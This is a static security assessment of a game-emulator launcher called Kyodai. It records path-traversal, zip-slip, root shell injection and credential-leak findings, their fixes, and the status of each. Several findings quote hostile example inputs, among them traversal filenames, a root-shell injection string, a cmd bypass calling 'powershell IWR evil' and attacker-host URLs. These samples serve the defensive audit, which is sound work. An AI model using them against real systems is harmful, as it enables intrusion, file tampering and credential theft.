# Kyodai — Security Risk Assessment (Pre-Beta)

**Date:** 2026-10-18
**Version assessed:** 0.6 (`com.heckpoint.kyodai`, working tree)
**Method:** Static review (all platforms: Windows, Linux, Android). No dynamic testing or PoC execution.
**Threat profiles in scope:** malicious/compromised RomM server · network MITM · malicious registry/config content · local attacker / device theft · supply chain.

---

## 1. Executive Summary

Kyodai has a solid architectural foundation: TLS certificate validation is never disabled, SQL is consistently parameterized, process spawning uses correct POSIX/PowerShell escaping in the main launch paths, and the Android manifest is clean. However, the assessment identified **a systemic pattern of trusting server-supplied filenames and registry JSON content without validation**, which produces multiple arbitrary-file-write, arbitrary-file-delete, and (on Android handhelds) root-code-execution paths. Credential storage is obfuscation-grade, and the entire emulator supply chain lacks integrity verification.

**Recommendation: NO-GO for public beta until the eight beta-blockers in §6 are resolved.** Most are small, well-scoped fixes. The supply-chain integrity work (KYD-09) is the only item that may warrant phasing.

> **Update 2026-10-18:** All eight beta-blockers (KYD-01 through KYD-05, KYD-07, KYD-08, KYD-10) plus KYD-13 have been remediated and verified — see the status column in §6. KYD-09 phase 1a (upstream API digest verification) has also landed. Remaining pre-beta work: KYD-06 (credential storage), KYD-11 (attrib invocation), and the rest of KYD-09 phase 1 (update confirmation sheet). Android builds must be re-exported to ship the rebuilt plugin AAR.

**Findings:** 6 Critical/High (server-trust), 4 High (credentials/transport/root/supply-chain), 6 Medium, 10 Low, plus informational notes.

---

## 2. Findings

Severity: 🔴 Critical · 🟠 High · 🟡 Medium · 🔵 Low · ⚪ Info

### KYD-01 🔴 Arbitrary file write via server-controlled download filenames

**Component:** Game/emulator downloads
**Evidence:**
- `managers/data_manager/sync_sub_manager.gd:2275` — `game.file_name = str(data.get("fs_name", ""))` (server value stored raw)
- `managers/system_manager/download_sub_manager.gd:830,843-845` — `var destination_path = dest_dir + "/" + file_name`
- `managers/system_manager/network_sub_manager.gd:745` — `destination_path.replace("\\", "/")` **actively weaponizes Windows-style traversal** (`..\..\..\.bashrc` becomes a working `../../../.bashrc` on Linux)
- `dest_dir` itself contains a second server-controlled component: `download_sub_manager.gd:762` (`root_folder + "/" + game.platform_slug`)

**No filename sanitization exists anywhere in the codebase** — repo-wide searches for `validate_filename`, `is_safe_path`, `..` checks return no matches. The one sanitizer (`game_save_sub_manager.gd:2145`) has zero callers (dead code).

**Exploit scenario:** A malicious or compromised RomM server (or MITM on an `http://` instance) returns `fs_name = "../../.config/autostart/evil.desktop"`. User clicks download → attacker-controlled bytes land at any user-writable path. No user-visible anomaly.

**Remediation:** Sanitize every server-derived filename at ingestion (`sync_sub_manager.gd:2275`, `download_sub_manager.gd:830`, `game_details_sheet.gd:1504`): reject names containing `/`, `\`, `..`, or use `String.validate_filename()`. Add a canonical-path containment check in `queue_download`/`http_download_file` (resolve dest, verify it stays under the intended root). **Effort: S.**

---

### KYD-02 🔴 Arbitrary file write via save downloads (auto-triggered on launch)

**Component:** Save sync
**Evidence:** `managers/data_manager/game_save_sub_manager.gd:2886-2938` — `remote.get("file_name")` from `/api/saves` is joined to `save_dir` and written for non-folder saves on non-RetroArch emulators. Triggered **automatically** on game launch via `auto_download_saves_for_game` (line 3458) when `save_sync_auto` is enabled. A partial guard (lines 2926-2931) refuses to overwrite *existing* files, but writing *new* files at traversed paths is unimpeded.

**Exploit scenario:** Poisoned `/api/saves` entry → arbitrary new-file write the next time the user launches any game. No user action beyond launching a game.

**Remediation:** Same ingestion-time sanitization as KYD-01 + containment check at write. **Effort: S.**

---

### KYD-03 🔴 Zip-slip in 3DS save unpacker (auto-triggered on launch)

**Component:** `_unpack_3ds_save`
**Evidence:** `managers/data_manager/game_save_sub_manager.gd:2319-2336` — the root allowlist (`data`/`extdata`) rejects `../evil` as a root, but **never checks `sub` for `..`**. An archive entry `data/../../../../home/user/.bashrc` passes the match and produces `dest = <title_dir>/data/../../../../home/user/.bashrc`, which `_write_zip_entry` (2357-2364) writes. Reachable from server-supplied save zips via the `"unpack"` strategy, auto-triggered on launch.

**Remediation:** Reject any `sub` containing `..` segments; canonicalize and verify containment under `base`. **Effort: S.**

---

### KYD-04 🔴 Post-extraction rename defeats 7-Zip's own traversal protection

**Component:** `_normalize_backslash_paths`
**Evidence:** `managers/system_manager/filesystem_sub_manager.gd:1772-1833` — after every desktop extraction, ZIP members with literal backslashes (e.g. `..\..\..\tmp\evil` — legal flat filenames on Linux that 7-Zip 26.03 correctly extracts *inside* the target dir) are renamed to `root_dir/../../../tmp/evil`, with `make_dir_recursive` creating the escape path. Runs after **every** desktop extraction of server-supplied archives (saves, firmware, game zips).

This is the most subtle finding: the team reasonably delegated zip-slip defense to 7-Zip, but the normalization pass re-introduces the vulnerability *after* the defense has run.

**Remediation:** In `_normalize_backslash_paths`, skip any entry whose converted `new_rel` escapes `root_dir` (canonical containment check before rename). **Effort: S.**

---

### KYD-05 🔴 Arbitrary file deletion via server-controlled paths

**Component:** Download deletion & cleanup
**Evidence:**
- `managers/data_manager/data_manager.gd:454-459` — `delete_game_download` builds `root_path + "/" + game.platform_slug + "/" + del_file_name` from raw server values → user clicking "delete download" on a poisoned entry deletes any user-writable file (e.g. `../../.ssh/authorized_keys`).
- Download cleanup deletes server-influenced destinations: `download_sub_manager.gd:2485-2487, 3448-3449`; `network_sub_manager.gd:813-814, 826-827`. A server can serve a traversal `fs_name` (truncating/overwriting the victim), then abort — the client deletes it.

**Remediation:** Canonicalize and jail `abs_path` in `delete_game_download`; skip cleanup deletion when the destination fails the containment check from KYD-01. **Effort: S.**

---

### KYD-06 🟠 Credential storage is obfuscation-grade; no secure storage

**Component:** Settings persistence
**Evidence:**
- `managers/data_manager/settings_sub_manager.gd:244` — `const PASSWORD_KEY = "kyodai_v1"`; `_xor_encrypt/_xor_decrypt` (277-289) are XOR + base64. Key ships in the distributed binary → **zero confidentiality**; treat `user://user_prefs.tres` as plaintext.
- Only `romm_password` carries `encrypted=true` (`base_class/abstract/settings.gd:54`); `romm_url`/`romm_username` are plaintext.
- File permissions never set — default umask (world-readable on many Linux setups).
- On load failure a copy persists forever at `user://user_prefs.tres.corrupt.bak` (`settings_sub_manager.gd:148-150`).
- No logout / credential-wipe function exists; the password lives in memory indefinitely (`network_sub_manager.gd:16`).

**Remediation:** Use OS-native secret storage where possible (libsecret/KWallet via a GDExtension, Windows Credential Manager, Android Keystore). Minimum viable for beta: per-install random key stored with 0600 perms, explicit ciphertext marker prefix (also fixes KYD-18), set 0600 on `user_prefs.tres`, delete `.corrupt.bak` after successful recovery, add a "Sign out / forget credentials" button. **Effort: M.**

---

### KYD-07 🟠 Plain HTTP accepted → cleartext Basic auth on the wire

**Component:** RomM connection
**Evidence:**
- `network_sub_manager.gd:502-511` — `parse_url` defaults to `http`/port 80; nothing rejects or warns on `http://`.
- Auth is HTTP Basic (`_get_auth_header`, line 191-194), re-sent on **every** request; no session tokens.
- The only HTTPS hint is a UI placeholder string (`romm_connection_panel.gd:40`). No scheme validation anywhere in the connection flow or OOBE wizard.
- Android: `usesCleartextTraffic` is unset at source — final value comes from Godot's gradle template (unverified). See KYD-28.

**Exploit scenario:** User configures `http://romm.local` (common for LAN/self-signed instances — note HTTPS with self-signed certs fails hard under correct validation, *pushing users toward http*). Any LAN attacker sniffs base64 credentials and all ROM/save traffic.

**Remediation:** Warn prominently when the URL is `http://` ("credentials will be sent unencrypted"); consider requiring explicit opt-in per host. Set `usesCleartextTraffic=false` + a `networkSecurityConfig` with per-domain cleartext exceptions on Android. Document recommended HTTPS setup for RomM. **Effort: S-M.**

---

### KYD-08 🟠 Root shell injection via registry-fed unquoted interpolation (Android handhelds)

**Component:** Root provisioning (AYN/Retroid/Ayaneo)
**Evidence:**
- `managers/launch_manager/emulator_sub_manager.gd:2143-2155` — `_build_prefs_write_script` interpolates `package`, `prefs_path`, `dir` **unquoted** into a script executed **as root** via `RootShell.java` (PServerBinder binder transaction / `/product/bin/xsu`). `_root_read_prefs` (line 2082) is `"cat " + prefs_path` — also unquoted.
- `RootShell.quote()` exists (`RootShell.java:56-58`) but has **zero call sites**. The Java contract "Callers must build scripts from fixed strings only" (`KyodaiBridgePlugin.java:3142`) is violated by design.
- Registry values come from `data/emulators/*.json` **or user overrides**: `registry_sub_manager.gd:7-9,109-121` — `user://emulator_registry/*.json` fully replaces built-in entries with only minimal validation (meta.id/name/platforms + non-empty launch dict). `provision` blocks are unrestricted.
- Invoked on **every Android game launch**: `process_sub_manager.gd:1422`.

**Exploit scenario:** A malicious "custom emulator pack" JSON (social-engineered install — a documented feature) with `"package": "x; id > /sdcard/pwned; #"` → arbitrary root shell on AYN/Retroid/Ayaneo devices at next launch. On desktop, the same override mechanism redirects download URLs and executable globs (see KYD-09/KYD-16).

**Remediation:** Quote all interpolations (reuse `FSM._shell_quote`); validate registry-supplied package names against `^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$`; validate `file` against `^[A-Za-z0-9_.-]+$`; refuse `provision` blocks from user-registry entries entirely. **Effort: S.**

---

### KYD-09 🟠 No integrity verification in the entire emulator supply chain

**Component:** Emulator/core/firmware install & update
**Evidence:**
- Zero `sha256`/`checksum`/`signature` fields in `data/emulators/*.json`; no hash verification anywhere in the install pipeline. The SHA-256 machinery in `download_sub_manager.gd:1879-2206` is **chunk-resume self-consistency only** (trust-on-first-download, line 2174-2175).
- Chain: registry URL → GitHub/Gitea API or **HTML scrape** → download → 7z extract → `chmod +x` → `OS.create_process`; APKs → system installer (Kyodai performs no package/signature check, only a >1000-byte size test at `emulator_sub_manager.gd:602`).
- RetroArch cores: `buildbot.libretro.com` `latest/` (zero version pinning) → extracted → **dlopen'd as native code** by RetroArch (`core_sub_manager.gd:237-259`).
- Firmware: from the user's RomM server (http permitted) → extracted into firmware dirs; server `file_name` used directly in temp paths (`firmware_sub_manager.gd:431`).
- Update flow: user-initiated check, but installation of **all** detected updates is automatic with no review step (`registry_sub_manager.gd:506-509`); re-uploaded assets count as updates (`:768-780`).
- **Trust concentration:** several artifacts come from individual maintainer forks (`izzy2lost/xemu`, `SSimco/Cemu`, `has207/xenia-edge`, `rfandango/XenDroid`, `rafaelvcaetano/melonDS-android`) and an unofficial repackager (`pkgforge-dev/*`). Single-account compromise = malware push to all users. Rolling tags (`pre-release`, `nightly-release`) make this permanent.

**Exploit scenario:** Compromised buildbot.libretro.com or a hijacked maintainer account → trojaned binary/core/APK installed and executed on next install or update. Undetectable today — no pinned hashes exist to compare against.

**Remediation:** (Phase 1, beta) Add expected SHA-256 fields to registry JSONs for the highest-volume artifacts and verify post-download; pin core versions instead of `latest/` where feasible; add a confirmation sheet listing updates before install. (Phase 2, post-beta) Extend hashes to all artifacts; verify APK signing certificates against expected signer digests. **Effort: M-L.**

---

### KYD-10 🟠 Auth header scoping bypasses → credential exfiltration

**Component:** Authorization header handling
**Evidence:**
- `network_sub_manager.gd:214-218` — `get_auth_headers_for_url` uses a raw string prefix check (`url.begins_with(base)`), not a host check. URLs like `http://romm.local:8080.evil.com/x` or `http://romm.local:8080@evil.com/x` satisfy the prefix and receive Basic credentials for a **different host**. Amplified by `build_media_url` (206-210) passing server-supplied absolute URLs through unvalidated (used for image/avatar downloads).
- `download_sub_manager.gd:1341-1342` — game downloads attach auth **unscoped** by item type; Godot's `HTTPRequest` re-sends headers across redirects → redirect-based credential exfiltration.

**Exploit scenario:** Malicious RomM server returns a hostile cover/avatar URL or a redirecting download URL → receives the user's base64 `user:pass`.

**Remediation:** Parse URL and compare scheme+host+port exactly; strip `Authorization` on cross-origin redirects; validate media URLs are same-origin (or relative) before use. **Effort: S.**

---

### KYD-11 🟡 Windows command injection via `cmd /c attrib -r` reparse

**Evidence:** `filesystem_sub_manager.gd:606,621,897` — `OS.execute("cmd", ["/c", "attrib", "-r", item_path], [], true)`. Although argv-passed, `cmd /c` re-parses the reconstructed command line; Godot only quotes args containing whitespace. NTFS-legal filenames like `save&calc.exe` (no spaces) pass unquoted → arbitrary command execution. Reachable during delete-fallback over archive-derived filenames (server-delivered ZIPs). Bypass string: `x&powershell -c IWR evil`.

**Remediation:** Call `attrib.exe` directly instead of `cmd /c`, or force-quote the path. **Effort: S.**

---

### KYD-12 🟡 Bundled tools in `user://bin/` trusted by file size only

**Evidence:** `utils/launch/android_binary_extractor.gd:24-30` — extracted copies of `7za.exe`, `pssuspend.exe`, `AutoHotkey64.exe`, `sigil`, `x11_windowctl` and the `.ahk` shuffler scripts are trusted when **file size matches**. Any same-UID process can plant a same-size malicious binary/script (trivially padded) → executed next extraction/shuffler run. Persistence vector rather than a privilege boundary, but cheap to close.

**Remediation:** Verify SHA-256 (compiled-in allowlist) on every use, not just first extract. **Effort: S.**

---

### KYD-13 🟡 Android zip-slip check missing trailing separator

**Evidence:** `KyodaiBridgePlugin.java:3000-3006` and `ExtractorService.java:294-300` — `canonicalOutput.startsWith(canonicalDest)` without a separator boundary: with dest `/a/tmp`, entry `../tmp2/x` canonicalizes to `/a/tmp2/x` and **passes**. Escape limited to prefix-sibling directories (still app-writable storage).

**Remediation:** Compare against `canonicalDest + File.separator` (special-case equality). **Effort: S.**

---

### KYD-14 🟡 `KyodaiUC` symlinks persistently downgrade scoped storage device-wide

**Evidence:** `KyodaiBridgePlugin.java:1701-1715`, `ExtractorService.java:492-506` — persistent world-visible symlinks `<storage>/KyodaiUC/data → <storage>/Android/data` (and `obb`) bypass Android 11+ FUSE filtering. While they exist, **every app** with broad storage access gets a direct path into all apps' `Android/data` private dirs.

**Remediation:** Create symlinks only for the durations needed and remove afterward, or scope to specific emulator packages. Document the tradeoff for users. **Effort: M.**

---

### KYD-15 🟡 Crafted `.zar` file → main-process memory-exhaustion DoS

**Evidence:** `utils/identity/zar_reader.gd:152-165,174-185` — `for i in range(start, start + count)` where `start`/`count` are raw u32 from the file. `dir_count = 0xFFFFFFFF` → billions of appends → hang/OOM of the **main Godot process** (reachable via PS4/Xbox 360 title-ID parsing of local ROM files). The `guard < 1000000` only caps pops, not the inner append loop.

**Remediation:** Cap `count` against `_file_tree.size()/16` before iterating. **Effort: S.**

---

### KYD-16 🟡 User registry override is a designed-in attack surface

**Evidence:** `registry_sub_manager.gd:109-121,147-172` — `user://emulator_registry/*.json` fully replaces built-ins: download URLs (any host incl. `http://`), executable globs, install steps, Android launch intents (`launchAndroidIntent` can launch **any exported component with arbitrary extras**), and root `provision` blocks (KYD-08). On desktop, any same-UID process can plant an override; on Android it requires social engineering (documented "custom emulators" feature).

**Remediation:** For user-supplied entries: restrict URL schemes to https, disallow `provision` blocks, warn in UI when an override shadows a built-in. Longer-term: sign built-ins, sandbox user entries to additive-only for unknown IDs. **Effort: M.**

---

### Low findings

| ID | Finding | Evidence |
|---|---|---|
| KYD-17 🔵 | Log leakage: unredacted URLs in download queue (`download_sub_manager.gd:654,660` bypass `_redact_url`); full server response bodies printed (`network_sub_manager.gd:1322,1330,1335,1412,1420,1425,1491-1493`); absolute local paths embedding OS usernames (`network_sub_manager.gd:840`, `game_save_sub_manager.gd:92,833,2768,2936,3709`). Amplified by Windows console wrapper (`export_presets.cfg:265`) and always-on file logging (`project.godot:32-33`). No passwords/headers are printed — verified. | |
| KYD-18 🔵 | `_is_base64` heuristic (`settings_sub_manager.gd:262-270`) misclassifies plaintext passwords that happen to be valid base64 (e.g. `"password"`) → irreversible corruption on load. Add a ciphertext marker prefix. | |
| KYD-19 🔵 | `prod.keys` staged to `user://temp/sigil/prod.keys` is never deleted (`sigil_runner.gd:113-129`). Console keys persist in the app user dir. Delete after `OS.execute` returns. | |
| KYD-20 🔵 | `file_paths.xml` is maximally broad (`<root-path path="."/>` etc.). Not exploitable today (provider `exported=false`, grants tightly scoped) but any future URI-grant path could expose app-private files including `user_prefs.tres`. Restrict to needed subdirs. | |
| KYD-21 🔵 | `EXTRACTION_COMPLETE` broadcast receiver registered `RECEIVER_EXPORTED` with no permission check (`KyodaiBridgePlugin.java:150-155`) — spoofable by any app. Harmless today (no GDScript consumes the signal); latent trap. Use `RECEIVER_NOT_EXPORTED`. | |
| KYD-22 🔵 | Extraction completion markers written to (often shared) extraction dirs are unauthenticated (`ExtractorService.java:720-734`; poller at `filesystem_sub_manager.gd:1222-1228`). Any app that can write the dir can forge "success". | |
| KYD-23 🔵 | `.desktop` Exec tokenization is not quote-aware and misses mid-token field codes (`navigation_sub_manager.gd:866-889`). User-pin gated, no shell at execution — correctness hardening only. | |
| KYD-24 🔵 | sigil native edge cases on crafted files (contained to short-lived child process): CHD missing `unitbytes <= hunkbytes` check → SIGFPE/heap over-read (`io_chd.c:88-102,30-39`); `.bin` size_t underflow → stack over-read (`io_raw_cd.c:46-48`); CSO unvalidated alignment shift (`io_cso.c:144,48-49`). | |
| KYD-25 🔵 | `cmd /c` `%`-doubling corrupts filenames containing `%` (batch idiom misapplied to `cmd /c` lines, `process_sub_manager.gd:76-80,1053`); delayed-expansion `!VAR!` unhandled (edge config). Availability bugs, not injection. | |
| KYD-26 🔵 | Root scripts/wrapper/output world-readable in app cache dir (`RootShell.java:78,90,93-94`). Gratuitous given parent-dir protections; tighten to owner-only. | |

### Informational (no action required for beta)

- **Emulator DB SQL**: identifier interpolation against emulator-written `game_list.db` (`game_sub_manager.gd:324,341`) — contained to that file, output validated. Low.
- **Steam VDF**: no NUL filtering on server-controlled titles written to binary `shortcuts.vdf` (`steam_vdf_writer.gd:157-160`) — robustness only.
- **CI/release**: debug-keystore signing for alpha APKs (authors flagged it themselves, `.github/workflows/export.yml:134-136`) — **switch to a real upload key before stable**; desktop builds unsigned (SmartScreen noise).
- **PCK unencrypted** — expected for OSS; nothing secret should ship in `res://`.
- **Repo hygiene**: ~72 MB of committed `~RF*.TMP` DLL duplicates in `addons/godot-sqlite/bin/` — `.gitignore` covers them now; remove from history/index.
- **Hostname disclosure** to RomM during device registration (`network_sub_manager.gd:1526-1528`) — by design; note in privacy docs.
- **Broad Android permissions** (`MANAGE_EXTERNAL_STORAGE`, `QUERY_ALL_PACKAGES`, `REQUEST_INSTALL_PACKAGES/DELETE_PACKAGES`) — documented well in `android/PERMISSIONS.md`; appropriate for the use case but they set the blast radius if the app is ever compromised. Keep the doc current.

---

## 3. Positive controls observed

Credit where due — these are correct and should be preserved:

- **TLS certificate validation never disabled** anywhere; `TLSOptions.client()` used with defaults.
- **SQL fully parameterized**; all string-built SQL uses whitelisted identifiers or `?` placeholders (exhaustively audited).
- **Shell escaping helpers are correct** — `_escape_sh_arg`, `_escape_ps_arg`, `_shell_quote` survived adversarial analysis; no bypass constructed for the launch wrappers. Direct `OS.create_process` (argv array, no shell) is the default launch path.
- Auth header is scoped to the configured base URL in most paths (modulo KYD-10); scraper URL credentials are redacted in logs (`_redact_url`).
- **No network listeners** — UDP/TCP sends are hardcoded localhost (RetroArch command ports).
- Android manifest: all components `exported="false"`, no intent filters; `installApk` uses FileProvider + explicit grant to the system installer only; `user_data_backup/allow=false`.
- Android extractor has a canonical-path containment check (modulo KYD-13's prefix bug); partial downloads cleaned up on failure.
- Bundled 7-Zip is current (Windows 25.01 / Linux 26.03 — CVE-2024-11477 and CVE-2025-0411 patched); sigil's C code shows good hygiene (capped allocations, no unsafe string functions).
- Secrets hygiene: `.godot/export_credentials.cfg` is gitignored and empty; no keys/tokens/certs committed; `.gitignore` coverage is good.
- GameNative/Steam integration downloads nothing executable and handles no Steam tokens — trust boundary correctly delegated.

---

## 4. Architecture-level observations

1. **Server trust is the dominant theme.** KYD-01 through KYD-05 all stem from one assumption: that RomM server responses are benign. RomM is self-hosted, but "self-hosted" ≠ trusted: server compromise, rogue admin on shared instances, or MITM on an http URL all weaponize it. The fix pattern is uniform — *sanitize at ingestion, verify containment at write* — and can be implemented as two shared helpers (`sanitize_server_filename()`, `assert_contained(path, root)`) applied at ~8 call sites.
2. **Registry overrides conflate customization with trust.** A user-facing customization feature can silently redirect downloads, intents, and root scripts. Needs trust-tiering (KYD-08/KYD-16).
3. **Supply chain rests entirely on TLS + origin goodwill.** No independent attestation of any artifact. Hash pinning is the pragmatic middle ground for a beta (KYD-09).

---

## 5. Residual risk statement

After beta-blockers are fixed, the meaningful residual risks are: (a) supply-chain origins without hash coverage, (b) the vendor root daemons themselves (PServerBinder/xsu) which are outside Kyodai's control, (c) broad Android permissions inherent to the product category, and (d) local same-UID attackers on desktop (largely out of threat model for a launcher). These are acceptable for a beta with documented disclosures.

---

## 6. Beta-blocker list vs. backlog

### Must fix before public beta (blockers)

| # | Finding | Why it blocks | Effort | Status |
|---|---|---|---|---|
| 1 | KYD-01 download path traversal | Trivially exploitable arbitrary write by any malicious server | S | ✅ **Fixed 2026-10-18** — ingestion sanitization + write-time guards |
| 2 | KYD-02 save download traversal | Same, **auto-triggered on launch** | S | ✅ **Fixed 2026-10-18** |
| 3 | KYD-03 3DS zip-slip | Same, auto-triggered | S | ✅ **Fixed 2026-10-18** — per-entry containment check |
| 4 | KYD-04 backslash-rename traversal | Defeats the one defense in place | S | ✅ **Fixed 2026-10-18** — escapes skipped in `_normalize_backslash_paths` |
| 5 | KYD-05 arbitrary deletion | Destructive; same root cause | S | ✅ **Fixed 2026-10-18** — containment jail in `delete_game_download` |
| 6 | KYD-08 root-shell quoting + registry validation | Root RCE on target handheld demographic | S | ✅ **Fixed 2026-10-18** — all interpolations shell-quoted + strict package/file validation |
| 7 | KYD-10 auth scoping | Credential exfiltration | S | ✅ **Fixed 2026-10-18** — exact origin matching (scheme+host+port), userinfo/malformed-authority hardening in `parse_url`, URL-scoped download auth, off-origin media URLs refused |
| 8 | KYD-07 http warning + Android cleartext config | Credential exposure on the wire | S-M | ✅ **Fixed 2026-10-18** — UI warning + mandatory acknowledgment before saving/testing `http://`; explicit `usesCleartextTraffic` documented in manifest + PERMISSIONS.md |

Fixes 1–5 share one remediation pattern and landed together: `FSM.sanitize_server_filename()` + `FSM.is_path_contained()` (`filesystem_sub_manager.gd`), applied at ingestion (`sync_sub_manager`, `download_sub_manager`, `game_save_sub_manager`, `firmware_sub_manager`, `game_details_sheet`) and at write/delete time (`queue_download`, `http_download_file`, `delete_game_download`, `_unpack_3ds_save`, `_normalize_backslash_paths`). KYD-13 (Android extractor separator boundary, both `ExtractorService` and `KyodaiBridgePlugin`) fixed in the same pass. Verified: full editor script scan clean; 30/30 functional helper tests pass (traversal, backslash, unicode, `user://`, prefix-sibling, injection-quoting cases).

### Strongly recommended before beta

| # | Finding | Effort | Status |
|---|---|---|---|
| 9 | KYD-06 credential storage minimum viable (random key, 0600 perms, marker prefix, sign-out) | M | ⬜ Open |
| 10 | KYD-09 phase 1 (hashes for top artifacts, update confirmation sheet) | M | 🟡 **Partially addressed 2026-10-18** — upstream API digest verification (1a): release-asset SHA-256 captured from GitHub-compatible APIs and verified post-download, before extract/install; mismatch deletes the file and aborts. No-op where hosts publish no digest (Gitea/Forgejo, HTML scrapes, direct URLs). Confirmation sheet + scrape-source coverage remain open |
| 11 | KYD-11 attrib direct call | S | ⬜ Open |
| 12 | KYD-13 Android extractor separator fix | S | ✅ **Fixed 2026-10-18** (bundled with blockers above) |

### Post-beta backlog

KYD-12 (hash-verified tool cache), KYD-14 (scoped-storage symlink strategy), KYD-15 (zar caps), KYD-16 (registry trust tiers), KYD-09 phase 2 (full hash coverage + APK signer checks), all Low findings, debug-keystore → release signing, desktop codesigning.

---

## Appendix A — Verification notes

- All findings verified against the working tree with file:line evidence; escaping-helper analysis included attempted construction of bypass strings (quotes, `$(...)`, backticks, newlines, PS metacharacters) — none succeeded against `_escape_sh_arg`/`_escape_ps_arg`.
- Recon claim "export_credentials.cfg committed" was **refuted** on verification (gitignored, empty).
- Recon claim "outdated 7-Zip" was **refuted** (25.01/26.03 are current).
- No dynamic testing performed per scope; exploit scenarios are code-path-derived.
